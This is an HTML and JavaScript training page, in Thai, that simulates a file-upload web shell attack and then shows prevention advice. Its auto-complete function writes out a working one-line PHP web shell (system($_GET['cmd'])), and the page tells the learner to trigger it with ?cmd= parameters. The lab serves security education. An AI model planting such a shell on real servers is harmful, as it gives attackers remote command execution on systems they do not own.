<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>Web Shell Upload Lab</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">

    <style>
        body { background-color: #0f172a; color: #e2e8f0; font-family: 'Courier Prime', monospace; }
        
        /* Code Editor Style */
        .code-editor {
            background-color: #1e1e1e;
            color: #d4d4d4;
            border: 1px solid #333;
            border-radius: 5px;
            font-family: 'Courier Prime', monospace;
            padding: 10px;
            width: 100%;
            height: 200px;
            resize: none;
        }
        .editor-header {
            background: #252526; padding: 5px 10px; border-radius: 5px 5px 0 0; border: 1px solid #333; border-bottom: none;
            display: flex; justify-content: space-between; align-items: center;
        }
        .filename-input {
            background: #3c3c3c; border: 1px solid #555; color: white; padding: 2px 5px; font-size: 0.9rem;
        }

        /* Browser Simulation */
        .browser-window {
            background-color: #fff; color: #333; border-radius: 8px; overflow: hidden;
            font-family: sans-serif; min-height: 400px; position: relative;
        }
        .browser-bar {
            background-color: #e2e8f0; padding: 10px; border-bottom: 1px solid #cbd5e1;
            display: flex; gap: 10px;
        }
        .url-input {
            width: 100%; padding: 5px 10px; border-radius: 20px; border: 1px solid #cbd5e1; color: #333;
        }
        .web-content { padding: 20px; height: 350px; overflow-y: auto; background: #fff; }

        /* Server File System */
        .server-files {
            background: #000; color: #0f0; padding: 10px; font-family: monospace; font-size: 0.8rem;
            height: 150px; overflow-y: auto; border: 1px solid #333; margin-top: 10px;
        }

        #preventionSection { display: none; animation: slideUp 0.8s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div class="container mt-4 pb-5">
        <div class="d-flex justify-content-between align-items-center mb-3">
            <!-- ปรับชื่อหัวข้อตรงนี้ -->
            <h3 class="text-warning">📤 Lab 9: Web Shell Upload & Execute</h3>
            <a href="/lab" class="btn btn-outline-light btn-sm">ออกจาก Lab</a>
        </div>

        <div class="row">
            <!-- ฝั่งซ้าย: Hacker Machine (Editor) -->
            <div class="col-md-5">
                <div class="card bg-dark border-secondary shadow mb-3">
                    <div class="card-header border-secondary text-white">
                        <i class="bi bi-laptop"></i> Hacker's Machine (Text Editor)
                    </div>
                    <div class="card-body">
                        <p class="small text-muted mb-2">1. สร้างไฟล์ PHP Web Shell เพื่อรับคำสั่งจาก URL</p>
                        
                        <div class="editor-header">
                            <span class="text-muted small">Filename:</span>
                            <input type="text" id="filename" class="filename-input" value="shell.php">
                        </div>
                        <textarea id="codeArea" class="code-editor" spellcheck="false"><?php
// พิมพ์โค้ด Web Shell ที่นี่
// Hint: ใช้คำสั่ง system() เพื่อรัน command จาก $_GET['cmd']

?></textarea>
                        
                        <div class="d-flex justify-content-between mt-2">
                             <button class="btn btn-sm btn-outline-warning" onclick="insertHintCode()">
                                <i class="bi bi-magic"></i> Auto-Complete Code
                            </button>
                            <button class="btn btn-primary btn-sm" onclick="uploadFile()">
                                <i class="bi bi-cloud-upload"></i> Upload to Server
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Server File System View -->
                <div class="card bg-dark border-secondary">
                    <div class="card-header border-secondary text-white small">
                        <i class="bi bi-hdd-rack"></i> Server Storage (/var/www/html/uploads/)
                    </div>
                    <div class="card-body p-0">
                        <div class="server-files" id="serverFileList">
                            <div>[DIR] .</div>
                            <div>[DIR] ..</div>
                            <div>[FILE] index.html</div>
                            <div>[FILE] logo.png</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- ฝั่งขวา: Browser & Execution -->
            <div class="col-md-7">
                <div class="browser-window shadow-lg">
                    <!-- URL Bar -->
                    <div class="browser-bar">
                        <div class="d-flex gap-2 text-secondary">
                            <i class="bi bi-arrow-left"></i> <i class="bi bi-arrow-right"></i> <i class="bi bi-arrow-clockwise"></i>
                        </div>
                        <input type="text" id="urlBar" class="url-input" 
                               value="http://vulnerable-site.com/"
                               onkeypress="if(event.key === 'Enter') browseUrl()">
                        <button class="btn btn-sm btn-primary" onclick="browseUrl()">Go</button>
                    </div>

                    <!-- Web Content -->
                    <div class="web-content" id="browserContent">
                        <div class="text-center mt-5">
                            <h1>Welcome to Upload Server</h1>
                            <p class="text-muted">Files are stored in <code>/uploads/</code></p>
                            <hr>
                            <p>Tip: เมื่ออัปโหลดเสร็จ ให้ลองเข้าถึงไฟล์ผ่าน URL<br>เช่น <code>http://.../uploads/shell.php?cmd=whoami</code></p>
                        </div>
                    </div>
                </div>

                <!-- Prevention Section -->
                <div id="preventionSection" class="card mt-3 border-success bg-dark text-white">
                    <div class="card-header bg-success">
                        <h6 class="mb-0"><i class="bi bi-shield-check"></i> วิธีป้องกัน (Prevention)</h6>
                    </div>
                    <div class="card-body small">
                        <p>การปล่อยให้ผู้ใช้อัปโหลดไฟล์ <code>.php</code> และสั่งรันได้ เป็นช่องโหว่ระดับ Critical</p>
                        <ul>
                            <li><strong>Allow List:</strong> อนุญาตเฉพาะนามสกุลไฟล์ที่จำเป็นเท่านั้น (เช่น .jpg, .png, .pdf)</li>
                            <li><strong>Disable Execution:</strong> ปิดการทำงานของ PHP Engine ในโฟลเดอร์ uploads (ใช้ .htaccess)</li>
                            <li><strong>Randomize Filename:</strong> เปลี่ยนชื่อไฟล์เป็นค่าสุ่ม เพื่อไม่ให้ Hacker เรียกไฟล์ถูก</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // จำลองไฟล์บน Server
        let serverFiles = ['index.html', 'logo.png'];
        let uploadedContent = ""; // เก็บเนื้อหาไฟล์ที่ user อัปโหลด

        function insertHintCode() {
            const code = "<?php\n  // รับค่า cmd จาก URL แล้วสั่งรันในเครื่อง\n  if(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n  }\n?>";
            document.getElementById('codeArea').value = code;
        }

        function uploadFile() {
            const filename = document.getElementById('filename').value;
            const content = document.getElementById('codeArea').value;

            if(!filename.endsWith('.php')) {
                alert("Lab นี้บังคับให้อัปโหลดไฟล์ .php เพื่อทดสอบ Web Shell ครับ");
                return;
            }

            // จำลองการอัปโหลด
            if(!serverFiles.includes(filename)) {
                serverFiles.push(filename);
            }
            uploadedContent = content; // บันทึกเนื้อหา (Mock)

            updateFileList();
            alert("Upload Success! ไฟล์ถูกเก็บไว้ที่ /uploads/" + filename);
        }

        function updateFileList() {
            const list = document.getElementById('serverFileList');
            let html = '<div>[DIR] .</div><div>[DIR] ..</div>';
            serverFiles.forEach(f => {
                html += `<div>[FILE] ${f}</div>`;
            });
            list.innerHTML = html;
        }

        function browseUrl() {
            const urlBar = document.getElementById('urlBar');
            const content = document.getElementById('browserContent');
            const prevention = document.getElementById('preventionSection');
            
            let url = urlBar.value;
            
            // Basic Routing Simulation
            if (url.includes('/uploads/')) {
                // ดึงชื่อไฟล์และพารามิเตอร์
                // ตัวอย่าง: http://site.com/uploads/shell.php?cmd=ls
                
                const parts = url.split('/uploads/');
                if(parts.length < 2) return;

                const fileAndQuery = parts[1].split('?');
                const filename = fileAndQuery[0];
                const query = fileAndQuery[1] || "";

                // เช็คว่าไฟล์มีอยู่จริงไหม
                if (!serverFiles.includes(filename)) {
                    content.innerHTML = `<h3 class="text-danger">404 Not Found</h3><p>The file ${filename} does not exist.</p>`;
                    return;
                }

                // เช็คว่าเป็นไฟล์ PHP ที่เราอัปโหลดไหม
                if (filename.endsWith('.php') && uploadedContent.includes('system($_GET[\'cmd\'])')) {
                    
                    // Parse parameter ?cmd=...
                    const urlParams = new URLSearchParams(query);
                    const cmd = urlParams.get('cmd');

                    if (cmd) {
                        // Execute Command (Simulation)
                        let output = "";
                        if (cmd === 'ls') {
                            output = "index.html\nlogo.png\n" + filename + "\npasswords.db";
                        } else if (cmd === 'whoami') {
                            output = "www-data";
                        } else if (cmd === 'id') {
                            output = "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
                        } else {
                            output = `sh: ${cmd}: command not found`;
                        }

                        content.innerHTML = `
                            <div style="font-family: monospace; background: #eee; padding: 10px; height: 100%;">
                                <strong>Output of command '${cmd}':</strong><br><br>
                                <pre>${output}</pre>
                            </div>
                        `;

                        // Hack สำเร็จ
                        prevention.style.display = 'block';
                        prevention.scrollIntoView({ behavior: 'smooth' });

                    } else {
                        // ไฟล์ PHP ทำงาน แต่ไม่มี output เพราะไม่มี cmd
                        content.innerHTML = `<!-- PHP Script Executed Successfully (No Output) -->`;
                    }

                } else {
                    // ไฟล์อื่น หรือไฟล์ PHP ที่เขียนโค้ดไม่ถูก
                    content.innerHTML = `<div class="alert alert-warning">File loaded, but no output. Did you write the correct Web Shell code?</div>`;
                }

            } else {
                // หน้า Home
                content.innerHTML = `
                    <div class="text-center mt-5">
                        <h1>Welcome to Upload Server</h1>
                        <p class="text-muted">Files are stored in <code>/uploads/</code></p>
                    </div>
                `;
            }
        }
    </script>
</body>
</html>